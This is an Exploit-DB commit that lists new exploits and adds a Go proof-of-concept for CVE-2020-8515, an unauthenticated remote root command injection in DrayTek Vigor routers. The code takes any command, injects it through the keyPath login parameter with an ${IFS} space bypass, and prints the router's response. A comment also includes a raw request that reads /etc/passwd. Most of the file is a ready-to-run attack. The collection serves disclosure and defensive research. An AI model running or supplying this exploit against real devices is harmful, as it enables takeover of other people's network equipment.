169b528eaa6917f97396fde96327e35b7c21e0f9
Offensive Security <info@exploit-db.com>
2020-03-31 05:01:48 +0000

    DB: 2020-03-31
    6 changes to exploits/shellcodes
    
    Odin Secure FTP Expert 7.6.3 - 'Site Info' Denial of Service (PoC)
    10-Strike Network Inventory Explorer 9.03 - 'Read from File' Buffer Overflow (SEH)(ROP)
    Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation
    
    Multiple DrayTek Products - Pre-authentication Remote Root Code Execution
    
    ECK Hotel 1.0 - Cross-Site Request Forgery (Add Admin)
    Joomla! com_fabrik 3.9.11 - Directory Traversal
    Zen Load Balancer 3.10.1 - Remote Code Execution

---
+++ exploits/linux/remote/48268.go
@@ -0,0 +1,87 @@
+package main
+
+
+/*
+CVE-2020-8515: DrayTek pre-auth remote root RCE
+Mon Mar 30 2020 -  0xsha.io
+Affected:
+DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta,
+and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta,
+and 1.4.4_Beta
+You should upgrade as soon as possible to 1.5.1 firmware or later
+This issue has been fixed in Vigor3900/2960/300B v1.5.1.
+read more :
+https://www.skullarmy.net/2020/01/draytek-unauthenticated-rce-in-draytek.html
+https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/
+https://thehackernews.com/2020/03/draytek-network-hacking.html
+https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/
+exploiting using keyPath
+POST /cgi-bin/mainfunction.cgi HTTP/1.1
+Host: 1.2.3.4
+Content-Length: 89
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a
+ */
+
+import (
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+)
+
+func usage()  {
+
+	fmt.Println("CVE-2020-8515 exploit by  @0xsha ")
+	fmt.Println("Usage :  " + os.Args[0] + " URL " + "command"  )
+	fmt.Println("E.G :  " + os.Args[0] + " http://1.2.3.4 " + "\"uname -a\""  )
+}
+
+func main() {
+
+
+	if len(os.Args) < 3 {
+		usage()
+		os.Exit(-1)
+	}
+
+	targetUrl := os.Args[1]
+	//cmd := "cat /etc/passwd"
+	cmd := os.Args[2]
+
+
+	// payload preparation
+	vulnerableFile := "/cgi-bin/mainfunction.cgi"
+	// specially crafted CMD
+	// action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a
+	payload :=`'
+	/bin/sh -c 'CMD'
+	'`
+	payload = strings.ReplaceAll(payload,"CMD", cmd)
+	bypass := strings.ReplaceAll(payload," ", "${IFS}")
+
+	//PostForm call url encoder internally
+	resp, err := http.PostForm(targetUrl+vulnerableFile ,
+		url.Values{"action": {"login"}, "keyPath": {bypass} , "loginUser": {"a"}, "loginPwd": {"a"}   })
+
+	if err != nil{
+		fmt.Println("error connecting host")
+		os.Exit(-1)
+	}
+
+
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	
+	if err != nil{
+		fmt.Println("error reading data")
+		os.Exit(-1)
+	}
+	
+	fmt.Println(string(body))
+
+}
